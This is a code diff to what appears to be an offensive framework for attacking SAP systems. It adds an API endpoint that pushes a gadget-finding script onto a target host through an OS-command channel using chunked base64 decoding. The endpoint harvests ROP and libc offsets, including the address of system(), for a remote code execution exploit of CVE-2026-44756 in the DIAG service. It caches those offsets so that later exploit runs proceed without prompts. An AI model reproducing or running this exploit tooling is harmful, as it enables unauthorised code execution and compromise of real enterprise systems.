@@ -8032,15 +8032,19 @@ def create_app(api: SAPMAPApi) -> Bottle:
         # non-empty value replaces the corresponding module constant
         # for this one call — use tools/cve-2026-44756/find_gadgets.py
         # on the target to extract the values.
-        s1_off_hex = (data.get("stage1_dw_off_hex")   or "").strip()
-        s2_off_hex = (data.get("stage2_libc_off_hex") or "").strip()
-        sy_off_hex = (data.get("system_libc_off_hex") or "").strip()
-        # Stage-2 tail-layout overrides — needed when this glibc's
-        # stage2 gadget uses a non-default indirection
-        # (mov rdi,[rdi+DISP]; jmp [rax+B_OFF]).  find_gadgets.py
-        # prints both values when it picks a non-default candidate.
-        s2_disp_rdi_hex = (data.get("stage2_disp_rdi_hex") or "").strip()
-        s2_b_off_hex    = (data.get("stage2_b_off_hex")    or "").strip()
+        # Prefer body values → cached node values → module defaults.
+        # This lets an operator who ran "Capture CVE-2026-44756 gadgets"
+        # earlier skip every gadget-override prompt.
+        s1_off_hex = ((data.get("stage1_dw_off_hex")   or "").strip()
+                       or (node.cve_2026_44756_stage1_dw_off or ""))
+        s2_off_hex = ((data.get("stage2_libc_off_hex") or "").strip()
+                       or (node.cve_2026_44756_stage2_libc_off or ""))
+        sy_off_hex = ((data.get("system_libc_off_hex") or "").strip()
+                       or (node.cve_2026_44756_system_libc_off or ""))
+        s2_disp_rdi_hex = ((data.get("stage2_disp_rdi_hex") or "").strip()
+                            or (node.cve_2026_44756_stage2_disp_rdi or ""))
+        s2_b_off_hex    = ((data.get("stage2_b_off_hex")    or "").strip()
+                            or (node.cve_2026_44756_stage2_b_off or ""))
 
         # DIAG port: use the node's dispatcher if we know it, else 3200.
         # `node.instances` is a list of InstanceInfo dataclasses (not
@@ -8377,6 +8381,49 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
         _bg(f"{sid}:diag_crash_cve_44756",
              "CVE-2026-44756 DIAG crash probe", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/exploit_cve_2026_44756_capture_gadgets",
+                method="POST")
+    def node_exploit_cve_2026_44756_capture_gadgets(sid):
+        """Recon-only helper — deploy tools/cve-2026-44756/find_gadgets.py
+        to the target via SAPMAP's OS-exec channel, run it against the SID,
+        parse the FIND_GADGETS_OK line, and cache all 5 per-target gadget
+        offsets on the node.  Reuses the proven SAPXPG-friendly deploy
+        pattern (chunked base64 + openssl -A decode).  No exploit fired,
+        nothing crashes.
+
+        Cached values (all hex strings on the node) skip the "Override
+        gadget offsets?" prompts on subsequent DIAG RCE runs — the
+        operator just enters the command + rdx."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            from sap_cve_2026_44756_diag import auto_capture_gadgets
+            print(f"[*] {sid}: CVE-2026-44756 gadget capture — "
+                  f"deploying find_gadgets.py via OS-exec …")
+            r = auto_capture_gadgets(node)
+            if r.get("ok"):
+                node.cve_2026_44756_stage1_dw_off   = f"{r['stage1_dw_off']:#x}"
+                node.cve_2026_44756_stage2_libc_off = f"{r['stage2_libc_off']:#x}"
+                node.cve_2026_44756_system_libc_off = f"{r['system_libc_off']:#x}"
+                node.cve_2026_44756_stage2_disp_rdi = f"{r['stage2_disp_rdi']:#x}"
+                node.cve_2026_44756_stage2_b_off    = f"{r['stage2_b_off']:#x}"
+                print(f"[+] {sid}: stage1_dw     = {r['stage1_dw_off']:#x}")
+                print(f"[+] {sid}: stage2_libc   = {r['stage2_libc_off']:#x}")
+                print(f"[+] {sid}: system_libc   = {r['system_libc_off']:#x}")
+                print(f"[+] {sid}: stage2_disp_rdi = {r['stage2_disp_rdi']:#x}")
+                print(f"[+] {sid}: stage2_b_off    = {r['stage2_b_off']:#x}")
+                print(f"[*] {sid}: offsets cached on node.  DIAG RCE will "
+                      f"use them automatically — no more prompts.")
+            else:
+                print(f"[-] {sid}: gadget capture failed: {r.get('error')}")
+
+        _bg(f"{sid}:capgadgets_cve_44756",
+             "CVE-2026-44756 gadget capture", _run)
         return json.dumps({"status": "started"})
 
     @app.route("/api/node/<sid>/exploit_cve_2026_44756_capture_bases",
